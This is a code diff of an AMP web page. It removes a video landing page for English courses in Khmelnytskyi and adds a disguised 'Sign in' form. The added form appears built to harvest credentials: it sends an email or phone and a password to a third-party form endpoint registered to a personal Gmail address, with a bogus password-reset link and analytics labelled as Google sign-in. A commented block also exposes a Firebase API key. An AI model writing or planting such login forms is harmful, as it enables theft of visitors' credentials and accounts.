@@ -1,107 +1,369 @@
 <!doctype html>
-<html ⚡>
+<html ⚡ lang="ru">
 
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width">
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width">
+	<meta name="description" content="This is the AMP Boilerplate.">
 
-    <link rel="canonical" href="/index.html">
-    <link rel="shortcut icon" href="assets/favicon/android-icon-192x192-dunplab-1211.png">
-    <link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700" rel="stylesheet">
+	<link rel="canonical" href="/index.html">
+	<link rel="shortcut icon" href="assets/favicon/android-icon-192x192-dunplab-1211.png">
+	<link href="https://fonts.googleapis.com/css2?family=Roboto+Condensed:wght@300;400;700" rel="stylesheet">
+	<link rel="preload" as="script" href="https://cdn.ampproject.org/v0.js">
+	<!-- Load AMP -->
+	<script async src="https://cdn.ampproject.org/v0.js"></script>
+	<!-- Import other AMP Extensions here -->
+	<script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
+	<script async custom-element="amp-form" src="https://cdn.ampproject.org/v0/amp-form-0.1.js"></script>
 
-    <title>Курси англійської в Хмельницькому</title>
+	<style amp-custom>
+		@font-face {
+  font-family: Poppins;
+    src: url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+  src: url('Poppins.eot');
+  src: url('Poppins.eot?#iefix') format('embedded-opentype'),
+       url('Poppins.woff2') format('woff2'), /* Super Modern Browsers */
+       url('Poppins.woff') format('woff'), /* Pretty Modern Browsers */
+       url('Poppins.ttf')  format('truetype'), /* Safari, Android, iOS */
+       url('Poppins.svg') format('svg'); /* Legacy iOS */
+}
+/*
+		@font-face {
+    font-family: Poppins;
+    src: url('https://fonts.googleapis.com/css2?family=Poppins&display=swap');
+   }
+*/
 
-    <style amp-boilerplate>
-        body {
-            -webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-            -moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-            -ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
-            animation: -amp-start 8s steps(1, end) 0s 1 normal both
-        }
+		* {
+			margin: 0;
+			padding: 0;
+			box-sizing: border-box;
+			font-family: 'Poppins', sans-serif;
+		}
 
-        @-webkit-keyframes -amp-start {
-            from {
-                visibility: hidden
-            }
+		html,
+		body {
+			height: 100%;
+		}
 
-            to {
-                visibility: visible
-            }
-        }
+		body {
+			display: grid;
+			place-items: center;
+			text-align: center;
+			background: #dde1e7;
+		}
 
-        @-moz-keyframes -amp-start {
-            from {
-                visibility: hidden
-            }
+		.content {
+			margin-top: 100px;
+			width: 330px;
+			background: #dde1e7;
+			border-radius: 10px;
+			padding: 40px 30px;
+			box-shadow: -3px -3px 7px #ffffff73,
+				2px 2px 5px rgba(94, 104, 121, 0.288);
+		}
 
-            to {
-                visibility: visible
-            }
-        }
+		.content .text {
+			font-size: 33px;
+			font-weight: 600;
+			margin-bottom: 35px;
+			color: #000;
+		}
 
-        @-ms-keyframes -amp-start {
-            from {
-                visibility: hidden
-            }
+		.content .field {
+			height: 50px;
+			width: 100%;
+			display: flex;
+			position: relative;
+		}
 
-            to {
-                visibility: visible
-            }
-        }
+		.field input {
+			height: 100%;
+			width: 100%;
+			padding-left: 45px;
+			font-size: 18px;
+			outline: none;
+			border: none;
+			color: #595959;
+			background: #dde1e7;
+			border-radius: 25px;
+			box-shadow: inset 2px 2px 5px #babecc,
+				inset -5px -5px 10px #ffffff73;
+		}
 
-        @-o-keyframes -amp-start {
-            from {
-                visibility: hidden
-            }
+		.field input:focus~label {
+			box-shadow: inset 2px 2px 5px #babecc,
+				inset -1px -1px 2px #ffffff73;
+		}
 
-            to {
-                visibility: visible
-            }
-        }
+		.field:nth-child(2) {
+			margin-top: 20px;
+		}
 
-        @keyframes -amp-start {
-            from {
-                visibility: hidden
-            }
+		.field span {
+			position: absolute;
+			width: 50px;
+			line-height: 50px;
+			color: #595959;
+		}
 
-            to {
-                visibility: visible
-            }
-        }
+		.field label {
+			position: absolute;
+			top: 50%;
+			left: 45px;
+			pointer-events: none;
+			color: #666666;
+			transform: translateY(-50%);
+		}
 
-    </style><noscript>
-        <style amp-boilerplate>
-            body {
-                -webkit-animation: none;
-                -moz-animation: none;
-                -ms-animation: none;
-                animation: none
-            }
 
-        </style>
-    </noscript>
-    <style amp-custom>
-        
-        body {
-            background-color: #d5ffd8;
-        }
-    </style>
+		.field input:focus~label {
+			opacity: 0;
+		}
 
-    <script async custom-element="amp-video" src="https://cdn.ampproject.org/v0/amp-video-0.1.js"></script>
+		.forgot-pass {
+			text-align: left;
+			margin: 10px 0 10px 5px;
+		}
+
+		.forgot-pass a {
+			font-size: 16px;
+			color: #3498db;
+			text-decoration: none;
+		}
+
+		.forgot-pass:hover a {
+			text-decoration: underline;
+		}
+
+		button {
+			margin: 15px 0;
+			width: 100%;
+			height: 50px;
+			color: #000;
+			font-size: 18px;
+			font-weight: 600;
+			background: #dde1e7;
+			border: none;
+			outline: none;
+			cursor: pointer;
+			border-radius: 25px;
+			box-shadow: 2px 2px 5px #babecc,
+				-5px -5px 10px #ffffff73;
+		}
+
+		button:focus {
+			color: #3498db;
+			box-shadow: inset 2px 2px 5px #babecc,
+				inset -5px -5px 10px #ffffff73;
+		}
+
+		.signup {
+			font-size: 16px;
+			color: #595959;
+			margin: 10px 0;
+		}
+
+		.signup a {
+			color: #000;
+			text-decoration: none;
+		}
+
+		.signup a:hover {
+			text-decoration: underline;
+		}
+
+		.logo {
+			padding: 20px;
+			display: block;
+
+
+		}
+	</style>
+
+	<style amp-boilerplate>
+		body {
+			-webkit-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+			-moz-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+			-ms-animation: -amp-start 8s steps(1, end) 0s 1 normal both;
+			animation: -amp-start 8s steps(1, end) 0s 1 normal both
+		}
+
+		@-webkit-keyframes -amp-start {
+			from {
+				visibility: hidden
+			}
+
+			to {
+				visibility: visible
+			}
+		}
+
+		@-moz-keyframes -amp-start {
+			from {
+				visibility: hidden
+			}
+
+			to {
+				visibility: visible
+			}
+		}
+
+		@-ms-keyframes -amp-start {
+			from {
+				visibility: hidden
+			}
+
+			to {
+				visibility: visible
+			}
+		}
+
+		@-o-keyframes -amp-start {
+			from {
+				visibility: hidden
+			}
+
+			to {
+				visibility: visible
+			}
+		}
+
+		@keyframes -amp-start {
+			from {
+				visibility: hidden
+			}
+
+			to {
+				visibility: visible
+			}
+		}
+	</style><noscript>
+		<style amp-boilerplate>
+			body {
+				-webkit-animation: none;
+				-moz-animation: none;
+				-ms-animation: none;
+				animation: none
+			}
+		</style>
+	</noscript>
+
+	<title>tracxn</title>
+	<script type="application/ld+json">
+		{
+			"@context": "http://schema.org",
+			"@type": "Webpage",
+			"url": "https://www.leyaluo.com",
+			"name": "Курси англійської мови в Хмельницькому",
+			"headline": "Курси англійської мови в Хмельницькому",
+			"description": "Курси англійської мови в Хмельницькому",
+			"mainEntityOfPage": {
+				"@type": "WebPage",
+				"@id": "https://www.leyaluo.com"
+			},
+			"publisher": {
+				"@type": "Organization",
+				"name": "LeyaLuoLie",
+				"logo": {
+					"url": "https://www.leyaluo.com/assets/logo_ec.svg",
+					"width": 192,
+					"height": 192,
+					"@type": "ImageObject"
+				}
+			},
+			"image": {
+				"@type": "ImageObject",
+				"url": "https://www.leyaluo.com/assets/face.webp",
+				"width": 700,
+				"height": 700
+			}
+		}
+	</script>
 </head>
+
 <body>
-    <amp-video autoplay loop
-    width="720"
-    height="1280"
-    layout="responsive"
-    poster="/leyaluo/assets/screen1.jpg">
-    <source src="/leyaluo/assets/video1.webm"
-      type="video/webm" />
-    <source src="/leyaluo/assets/video1.mp4"
-      type="video/mp4" />
-    <div fallback>
-      <p>This browser does not support the video element.</p>
-    </div>
-  </amp-video>
-</body>
-</html>
+	<amp-analytics type="gtag" data-credentials="include">
+		<script type="application/json">
+			{
+				"vars": {
+					"gtag_id": "251812209",
+					"config": {
+						"251812209": {
+							"groups": "default",
+							"site_speed_sample_rate": 100
+						}
+					}
+				}
+			},
+			"triggers": {
+				"button": {
+					"selector": "btn-sign",
+					"on": "click",
+					"vars": {
+						"event_name": "Sign in",
+						"method": "Google"
+					}
+
+				};
+				"link": {
+					"selector": "forgot-pass",
+					"on": "click",
+					"vars": {
+						"event_name": "Forgot Password",
+						"method": "Google"
+					}
+
+				}
+			}
+			
+		</script>
+	</amp-analytics>
+
+	<!--=============================-->
+
+	<div class="content">
+		<div class="text">Sign in</div>
+		<form class="form" method="post" action-xhr="https://airform.io/shoes.native.ua@gmail.com" autocomplete="on" target="_top">
+			<div class="field">
+				<span class="fas fa-user"></span>
+				<input type="text" placeholder="Email or Phone" required>
+
+			</div>
+			<div class="field">
+				<span class="fas fa-lock"></span>
+				<input type="password" placeholder="Password" required>
+			</div>
+			<div class="forgot-pass"><a href="https://ng-check.com/znc-zenco-group-of-companies-limited/2700928.html">Forgot Password?</a></div>
+			<button type="submit" id="btn-sign">Sign in</button>
+			<!--
+        <div class="signup">Not a member?
+          <a href="#">signup now</a>
+        </div>
+-->
+		</form>
+	</div>
+
+
+	<!--
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-app.js"></script>
+
+
+<script src="https://www.gstatic.com/firebasejs/8.2.9/firebase-analytics.js"></script>
+
+<script>
+  var firebaseConfig = {
+    apiKey: "AIzaSyB5c-YmKqNiJ_FIam9g66ebDcCFFNcnrSI",
+    authDomain: "leyaluo-f37b1.firebaseapp.com",
+    projectId: "leyaluo-f37b1",
+    storageBucket: "leyaluo-f37b1.appspot.com",
+    messagingSenderId: "807299641153",
+    appId: "1:807299641153:web:0cd25a8b55f8b5c465fbc0",
+    measurementId: "G-XQBKBW77QP"
+  };
+
+  firebase.initializeApp(firebaseConfig);
+  firebase.analytics();
+</script>
+-->
+</body></html>
